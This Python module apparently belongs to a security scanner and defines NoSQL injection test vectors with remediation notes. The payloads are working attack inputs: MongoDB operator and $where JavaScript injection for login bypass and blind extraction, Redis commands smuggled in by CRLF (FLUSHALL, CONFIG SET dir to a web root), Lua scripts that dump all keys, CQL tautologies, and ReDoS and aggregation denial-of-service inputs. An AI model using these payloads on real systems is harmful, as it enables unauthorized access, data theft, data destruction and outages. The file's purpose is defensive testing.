"""
NoSQL Injection Testing Vectors
MongoDB, Redis, CouchDB injection attacks
"""

from ..models import (
    TestVector, VulnerabilityType, TestVectorPosition as Position, PositionType,
    TestVectorPayload as PayloadTemplate, TestVectorEvidence as Evidence, 
    ConfidenceLevel, SensitivityLevel
)

NOSQL_TEST_VECTORS = [
    TestVector(
        id="nosql-mongo-001",
        name="MongoDB Authentication Bypass",
        description="Tests for MongoDB operator injection in authentication",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="password", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$ne":""}',
            variants=['{"$ne":null}', '{"$ne":""}', '{"$gt":""}', '{"$regex":".*"}'],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Authentication bypass", "Admin access without password"],
            false_positive_indicators=["Login failed"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate input types. Use parameterized queries.",
        references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
        tags=["nosql", "mongodb", "authentication-bypass"]
    ),
    
    TestVector(
        id="nosql-mongo-002",
        name="MongoDB $where Injection",
        description="Tests for JavaScript injection in MongoDB $where operator",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$where":"this.username==\'admin\'||\'1\'==\'1\'"}',
            variants=[
                '{"$where":"1==1"}',
                '{"$where":"sleep(5000)"}',
                '{"$where":"function(){return true}"}',
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["All documents returned", "JavaScript executed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Avoid $where operator. Use safer query operators.",
        references=["https://cwe.mitre.org/data/definitions/943.html"],
        tags=["nosql", "mongodb", "$where", "javascript-injection"]
    ),
    
    TestVector(
        id="nosql-redis-001",
        name="Redis Command Injection",
        description="Tests for Redis command injection",
        vuln_type=VulnerabilityType.NOSQL_REDIS,
        position=Position(type=PositionType.QUERY, name="key", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="user:1\\r\\nCONFIG GET *\\r\\n",
            variants=[
                "key\\r\\nFLUSHALL\\r\\n",
                "key\\r\\nCONFIG SET dir /var/www/html\\r\\n",
                "key\\r\\nEVAL 'return 1' 0\\r\\n"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Redis commands executed", "Config exposure"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Validate input. Use Redis ACLs. Disable dangerous commands.",
        references=["https://cwe.mitre.org/data/definitions/943.html"],
        tags=["nosql", "redis", "command-injection"]
    ),
    
    TestVector(
        id="nosql-mongo-003",
        name="MongoDB Array Injection",
        description="Tests for array operator injection bypassing validation",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="user_id", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$in":["admin","user"]}',
            variants=[
                '{"$nin":[]}',
                '{"$all":["admin"]}',
                '{"$elemMatch":{"$ne":null}}',
                '{"$size":0}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Access to multiple users", "Data enumeration"],
            false_positive_indicators=["Access denied"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate input structure. Use strict typing. Implement access controls.",
        references=["https://owasp.org/www-project-web-security-testing-guide/"],
        tags=["nosql", "mongodb", "array-injection"]
    ),
    
    TestVector(
        id="nosql-mongo-004",
        name="MongoDB Aggregation Pipeline Injection",
        description="Tests for injection in aggregation pipeline stages",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="pipeline", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='[{"$match":{}},{"$project":{"password":1}}]',
            variants=[
                '[{"$match":{}},{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"data"}}]',
                '[{"$match":{}},{"$group":{"_id":null,"data":{"$push":"$$ROOT"}}}]',
                '[{"$match":{}},{"$addFields":{"admin":true}}]'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Unauthorized data access", "Sensitive fields exposed"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Sanitize pipeline stages. Restrict aggregation operations. Use allowlists.",
        references=["https://www.mongodb.com/docs/manual/core/aggregation-pipeline/"],
        tags=["nosql", "mongodb", "aggregation", "pipeline-injection"]
    ),
    
    TestVector(
        id="nosql-mongo-005",
        name="MongoDB Blind NoSQL Injection",
        description="Tests for time-based blind NoSQL injection",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$where":"sleep(5000)||true"}',
            variants=[
                '{"$where":"(function(){var start=Date.now();while(Date.now()-start<5000){}return true;})()"}',
                '{"$where":"this.password.match(\'^a.*\')&&sleep(5000)"}',
                '{"username":{"$regex":"^admin"},"$where":"sleep(5000)"}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Response delay of 5+ seconds", "Time-based data exfiltration"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Disable $where operator. Implement query timeouts. Use safer operators.",
        references=["https://cwe.mitre.org/data/definitions/943.html"],
        tags=["nosql", "mongodb", "blind-injection", "time-based"]
    ),
    
    TestVector(
        id="nosql-couchdb-001",
        name="CouchDB Mango Query Injection",
        description="Tests for injection in CouchDB Mango query language",
        vuln_type=VulnerabilityType.NOSQL_COUCHDB,
        position=Position(type=PositionType.BODY_JSON, name="selector", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"_id":{"$gt":null}}',
            variants=[
                '{"_id":{"$regex":".*"}}',
                '{"$or":[{"type":"admin"},{"type":"user"}]}',
                '{"password":{"$gt":""}}',
                '{"$and":[{"$gt":null}]}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["All documents returned", "Unauthorized data access"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate query structure. Implement field-level access controls. Use views with filters.",
        references=["https://docs.couchdb.org/en/stable/api/database/find.html"],
        tags=["nosql", "couchdb", "mango", "query-injection"]
    ),
    
    TestVector(
        id="nosql-redis-002",
        name="Redis Lua Script Injection",
        description="Tests for injection in Redis Lua EVAL commands",
        vuln_type=VulnerabilityType.NOSQL_REDIS,
        position=Position(type=PositionType.QUERY, name="script", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="return redis.call('CONFIG','GET','*')",
            variants=[
                "return redis.call('KEYS','*')",
                "return redis.call('FLUSHALL')",
                "return redis.call('GET',KEYS[1])..redis.call('GET','admin:password')",
                "local data='';for i,k in ipairs(redis.call('KEYS','*')) do data=data..k..'='..redis.call('GET',k)..'\\n' end;return data"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Lua script execution", "Config exposure", "Data enumeration"],
            confidence=ConfidenceLevel.CRITICAL
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        remediation="Disable EVAL/EVALSHA commands. Use Redis Functions. Implement script sandboxing.",
        references=["https://redis.io/docs/manual/programmability/eval-intro/"],
        tags=["nosql", "redis", "lua", "script-injection"]
    ),
    
    TestVector(
        id="nosql-cassandra-001",
        name="Cassandra CQL Injection",
        description="Tests for CQL injection in Cassandra queries",
        vuln_type=VulnerabilityType.NOSQL_CASSANDRA,
        position=Position(type=PositionType.QUERY, name="where", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="user_id='admin' OR '1'='1",
            variants=[
                "user_id='admin' ALLOW FILTERING",
                "user_id IN ('admin','user','guest')",
                "user_id>'0' ALLOW FILTERING",
                "user_id='' OR username>''"
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Unauthorized data access", "Query bypass"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Use prepared statements. Validate input. Implement proper access controls.",
        references=["https://cassandra.apache.org/doc/latest/cassandra/cql/"],
        tags=["nosql", "cassandra", "cql-injection"]
    ),
    
    TestVector(
        id="nosql-mongo-006",
        name="MongoDB Regex DoS",
        description="Tests for ReDoS via complex regex in MongoDB queries",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="username", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$regex":"^(a+)+$"}',
            variants=[
                '{"$regex":"(a|a)*"}',
                '{"$regex":"(a|ab)*"}',
                '{"$regex":"^(([a-z])+.)+[A-Z]([a-z])+$"}',
                '{"$regex":"([a-zA-Z]+)*"}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Server timeout", "High CPU usage", "Slow response"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Implement regex complexity limits. Set query timeouts. Use indexed queries.",
        references=["https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS"],
        tags=["nosql", "mongodb", "regex", "dos"]
    ),
    
    TestVector(
        id="nosql-mongo-007",
        name="MongoDB JSON Operator Chaining",
        description="Tests for chaining multiple operators to bypass filters",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="filter", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$and":[{"$or":[{"role":"admin"},{"role":"user"}]},{"$ne":{"deleted":true}}]}',
            variants=[
                '{"$nor":[{"status":"inactive"}]}',
                '{"$and":[{"$gt":{"created":"2020-01-01"}},{"$lt":{"created":"2030-01-01"}}]}',
                '{"$or":[{"$exists":{"password":true}},{"$exists":{"api_key":true}}]}',
                '{"$and":[{"$ne":null},{"$ne":""}]}'
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Filter bypass", "Expanded result set", "Unauthorized access"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.HIGH,
        remediation="Validate query structure depth. Implement operator allowlists. Use strict schemas.",
        references=["https://owasp.org/www-project-web-security-testing-guide/"],
        tags=["nosql", "mongodb", "operator-chaining"]
    ),
    
    TestVector(
        id="nosql-mongo-008",
        name="MongoDB Time-Based Blind Injection",
        description="Tests for time-based blind NoSQL injection using $where with sleep",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="query", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='{"$where": "sleep(5000)||1==1"}',
            variants=[
                '{"$where": "sleep(5000)||1==1"}',
                '{"$where": "var start = new Date().getTime(); while(new Date().getTime() < start + 5000);"}',
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["Response delay detected", "Time-based injection successful", "5 second delay"],
            confidence=ConfidenceLevel.HIGH
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Disable JavaScript execution. Block $where operator. Use parameterized queries.",
        references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection"],
        tags=["nosql", "mongodb", "blind-injection", "time-based"]
    ),
    
    TestVector(
        id="nosql-mongo-009",
        name="MongoDB $facet Aggregation DoS",
        description="Tests for DoS via complex $facet aggregation pipelines",
        vuln_type=VulnerabilityType.NOSQL_MONGODB,
        position=Position(type=PositionType.BODY_JSON, name="pipeline", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base='[{"$facet": {"a": [{"$limit": 999999999}], "b": [{"$limit": 999999999}]}}]',
            variants=[
                '[{"$facet": {"a": [{"$limit": 999999999}], "b": [{"$limit": 999999999}]}}]',
            ],
            encoding="none"
        ),
        expected_evidence=Evidence(
            indicators=["High memory usage", "Query timeout", "Database slowdown"],
            confidence=ConfidenceLevel.MEDIUM
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        remediation="Limit aggregation complexity. Set maxTimeMS. Restrict $facet usage.",
        references=["https://docs.mongodb.com/manual/reference/operator/aggregation/facet/"],
        tags=["nosql", "mongodb", "dos", "aggregation"]
    ),
]

# Total vectors: 13
